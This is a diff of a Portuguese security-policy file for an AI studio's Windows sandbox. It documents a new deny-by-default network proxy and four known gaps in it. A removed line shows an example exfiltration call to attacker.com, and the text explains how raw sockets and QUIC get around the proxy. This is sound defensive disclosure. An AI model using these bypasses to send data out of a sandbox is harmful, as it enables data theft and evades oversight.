@@ -1,10 +1,11 @@
 # Security Policy
 
 > Frederico IA Studio — modelo de segurança do sandbox Windows
-> (Fase 7, Etapa 5+).
+> (Fase 7, Etapa 6+1).
 >
-> **Última atualização:** 2026-08-10 (Etapa 5+ fechada — `runtime:
-> None → Sandboxed` reativado com path safety enforcement real).
+> **Última atualização:** 2026-08-13 (Etapa 6+1 fechada — proxy de
+> rede wireado de verdade em `exec.python`/`exec.node`, não mais
+> só um mecanismo isolado e testado à parte).
 
 ## Resumo
 
@@ -90,39 +91,70 @@ não bumpa nada"). Mas **read** está aberto.
 quando o usuário ativa explicitamente). O modelo default
 não os vê no schema — usuário precisa aprovar primeiro.
 
-### 2. **Rede** (child não está isolado de rede)
+### 2. **Rede** (proxy ligado no caminho real, mas com lacunas conhecidas)
 
-**Sintoma:** o child herda o acesso à rede do user. Pode
-fazer `urllib.request.urlopen("https://attacker.com/exfil?data=...")` 
-e exfiltrar o que leu (incluindo o banco, ver §1 acima).
-Pode também baixar código (`pip install ...`) e executá-lo
-fora do sandbox (o pip install roda dentro do child, mas
-modifica `%LOCALAPPDATA%\pip\` que é Medium — child consegue
-escrever lá, mesmo que o workdir esteja isolado).
+**Estado atual (Etapa 6 + 6+1, ADR-0033):** o child **não**
+herda mais a rede do host sem filtro. `exec.python`/`exec.node`
+sobem um proxy local (`127.0.0.1:<porta efêmera>`) por
+invocação de verdade — `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY`
+são injetados no env filtrado do child. O proxy é
+**deny-by-default**: sem o host na allowlist, toda request
+HTTP recebe `502 Bad Gateway` e todo `CONNECT` (HTTPS) também.
+HTTPS é um tunnel byte-opaco (`CONNECT` puro, sem MITM, sem CA
+custom no trust store) — o proxy decide pelo **host do
+CONNECT**, nunca vê o path ou o body; o audit trail grava
+`path_redacted="<redacted>"` pra HTTPS (o log não promete mais
+do que entrega). Toda decisão (allow/deny) é persistida em
+`network_audit` via `DbNetworkAuditSink`.
 
-**Por que não fechamos agora:** isolar a rede do child exige
-um dos:
+**O que isso NÃO fecha — 4 lacunas nomeadas:**
 
-- **Windows Filtering Platform (WFP)** — API kernel-mode
-  para filtro de pacotes por processo. Requer driver ou
-  service de Windows; overhead alto, deployment complexo.
-- **Network namespace** (Linux) — não-portável, e a Etapa 5+
-  é Windows-only.
-- **Proxy local no parent** (intercepts e loga todas as
-  conexões do child via `WSAIoctl`/`SP_PROT`) — funciona,
-  mas exige implementação dedicada (~500 LOC, Fases 8+).
+1. **Bypass por socket direto.** `HTTP_PROXY`/`HTTPS_PROXY` são
+   **convenção**, não imposição do SO. Um child que chama
+   `socket.socket(AF_INET, SOCK_STREAM)` e conecta direto
+   (ignorando as env vars do proxy) **não passa pelo proxy** —
+   `urllib`/`requests` do Python respeitam `HTTP_PROXY`, mas
+   código que abre socket raw não. Esse comportamento está
+   **fixado em teste**, não escondido:
+   `crates/e2e/tests/e2e_network_proxy.rs::e2e_network_raw_socket_bypasses_proxy_documented`
+   prova que a conexão raw funciona sem passar pelo proxy. A
+   defesa real pra isso é filtro de rede no nível de processo
+   (Windows Filtering Platform / WDAC) — exige driver ou
+   service, deployment complexo, roadmap Fase 8+.
+2. **HTTP/3 (QUIC) bypassa.** O proxy fala TCP + forward
+   HTTP/CONNECT; um client que negocia QUIC (UDP) conecta
+   direto ao destino, sem passar pelo proxy.
+3. **Janela de DNS leakage.** `dns_intercept` (Windows) troca a
+   resolução DNS pro proxy via `netsh interface ip set dns
+   ... source=static address=127.0.0.1` e reverte no `Drop`
+   (RAII). Se o `netsh` falhar (ou o processo morrer entre o
+   `set` e o `revert` sem passar pelo `recover_stale_runs` da
+   Etapa 5.x), há uma janela onde o DNS não está interceptado.
+   Em **Linux/macOS**, `set_dns_intercept` retorna
+   `Err(NotSupported)` (degradação declarada) — o proxy
+   funciona, mas DNS bypassa completamente nessas plataformas.
+4. **Allowlist ainda hardcoded vazia na casca.** Não existe
+   hoje um caminho pra usuário configurar hosts permitidos —
+   `ChatOrchestratorParts.network_allowlist` é campo vestigial
+   (não lido em lugar nenhum); a allowlist real vem só via
+   `ExecDeps`, e a casca a constrói vazia. Na prática isso é
+   **deny total** por default (mais restritivo, não menos —
+   citado aqui por transparência de escopo, não como risco). A
+   migration que carregaria a allowlist de settings
+   (`0037_network_allowlist.sql`) ainda não existe.
 
-**Risco concreto hoje:** um script Python rodando via
-`exec.python` pode conectar em qualquer host na internet.
-Combinado com o §1 (read-up do banco), isso é o vetor de
-**exfiltração** mais sério que ainda existe no produto.
+**Risco concreto hoje:** um script que evita `urllib`/`requests`
+e abre socket raw ainda alcança qualquer host — combinado com
+o §1 (read-up do banco), continua sendo o vetor de
+**exfiltração** mais sério do produto, só que agora só pra
+código que deliberadamente contorna a convenção do proxy (em
+vez de qualquer `requests.get(...)` trivial, como era antes da
+Etapa 6).
 
-**Mitigação temporânea:** o `PermissionSet` tem `network: bool`
-que o caller (UI de aprovação) controla por invocação. Quando
-o `exec.python` é invocado via UI, o modal mostra "este script
-pode acessar a rede" e o usuário decide. Mas **uma vez
-aprovado, a rede está aberta** — sem filtro de domínios
-(allowlist de `*.example.com`).
+**Mitigação:** o `PermissionSet` continua com `network: bool`
+controlado por invocação na UI de aprovação — a diferença é
+que "network: true" agora significa "proxy deny-by-default
+ligado", não "rede aberta sem filtro" como antes da Etapa 6.
 
 ### 3. **Pipes stdout/stderr sem label** (child pode escrever
    em pipes anônimos Medium)
@@ -179,6 +211,8 @@ do código. As ADRs da Fase 7 relevantes:
 
 - **ADR-0031** — Isolation model (Windows Job + Restricted Token
   + Env Filter)
+- **ADR-0033** — Política de rede do sandbox (deny-by-default,
+  proxy local, `CONNECT` sem MITM, log visível)
 - **ADR-0036** — `SecurityJailResolver` Windows (4 primitivas
   do sandbox)
 - **ADR-0007** — Fronteira Win32 (apenas módulo `windows` tem
@@ -189,6 +223,14 @@ Cobertura E2E em `crates/e2e/tests/`:
 - `e2e_exec_python_under_sandbox.rs` (3 tests: path safety,
   wall-clock, hello world)
 - `e2e_exec_node_under_sandbox.rs` (espelho Node)
+- `e2e_network_proxy.rs` (7 tests: allow/deny por allowlist,
+  tunnel CONNECT, bypass por socket raw documentado, audit
+  trail)
+- `e2e_network_proxy_wired_into_exec_python.rs` /
+  `e2e_network_proxy_wired_into_exec_node.rs` (prova do meio —
+  `HTTP_PROXY` funcionando de verdade dentro do child — antes
+  de aceitar a prova do fim; `DbNetworkAuditSink` persistindo
+  `run_id` correto)
 - `tree_kill.rs` (Job Object)
 - `jobs_test.rs` (Restricted Token)
 - `env_filter.rs` (Env Filter)
